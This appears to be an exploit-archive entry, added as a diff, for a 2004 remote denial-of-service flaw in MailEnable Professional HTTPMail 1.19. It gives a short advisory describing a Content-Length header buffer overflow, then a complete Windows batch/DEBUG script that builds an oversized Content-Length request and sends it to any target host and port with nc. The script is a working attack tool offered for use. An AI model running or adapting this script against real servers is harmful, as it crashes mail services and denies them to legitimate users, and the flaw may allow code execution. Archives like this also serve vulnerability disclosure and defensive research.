@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/10838/info
+
+MailEnable is reported prone to a remote denial of service vulnerability. This vulnerability is reported to exist in the MailEnable HTTP header parsing code.
+
+When reading a large content-length header field from an HTTP request, the operation overflows a fixed size memory buffer and the HTTP service will reportedly crash.
+
+The vulnerability can be exploited to crash the affected HTTP service, denying service to legitimate users. The possibility to execute arbitrary code may also be present.
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:Application:   MailEnable Professional HTTPMail
+:Vendors:       http://www.mailenable.com/
+:Version:       1.19
+:Platforms:     Windows
+:Bug:           D.O.S
+:Date:          2004-07-30
+:Author:        CoolICE
+:E_mail:        CoolICE#China.com
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+@echo off
+;if '%1'=='' echo Usage:%0 target [port]&&goto :eof
+;set PORT=8080
+;if not '%2'=='' set PORT=%2
+;for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe
+echo Need nc.exe&&goto :eof
+;DEBUG < %~s0
+;GOTO :run
+
+e 100 "GET / HTTP/1.0" 0D 0A "Content-Length: "
+!DOS@length>0x64
+f 120 183 39
+e 184 "XXXX" 0d 0a 0d 0a
+rcx
+8c
+nhttp.tmp
+w
+q
+
+
+:run
+nc %1 %PORT% < http.tmp
+del http.tmp
